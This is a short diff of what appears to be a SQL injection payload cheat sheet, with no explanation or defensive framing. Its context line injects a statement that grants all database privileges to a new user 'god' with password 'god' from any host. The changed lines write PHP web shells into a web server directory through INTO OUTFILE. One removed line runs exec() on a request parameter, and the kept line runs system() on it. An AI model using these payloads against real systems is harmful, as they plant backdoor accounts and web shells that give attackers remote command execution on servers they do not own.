@@ -14,6 +14,5 @@ dba:
 '; GRANT ALL PRIVILEGES ON *.* TO god@'%' IDENTIFIED BY 'god' WITH GRANT OPTION; -- '
 
 disk:
-'; SELECT '<?php system($_GET[\'cmd\']); ?>' INTO OUTFILE 'E:/xampp/htdocs/cmd.php'; -- ' //'/var/www/upload/cmd.php' -> bash cmdline
-'; SELECT '<?php var_dump($_GET[\'cmd\']);exec($_GET[\'cmd\']); ?>' INTO OUTFILE 'E:/xampp/htdocs/exec.php'; -- '
+'; SELECT '<?php system($_GET[\'cmd\']); ?>' INTO OUTFILE 'E:/xampp/htdocs/cmd.php'; -- ' //'/var/www/upload/cmd.php'
 
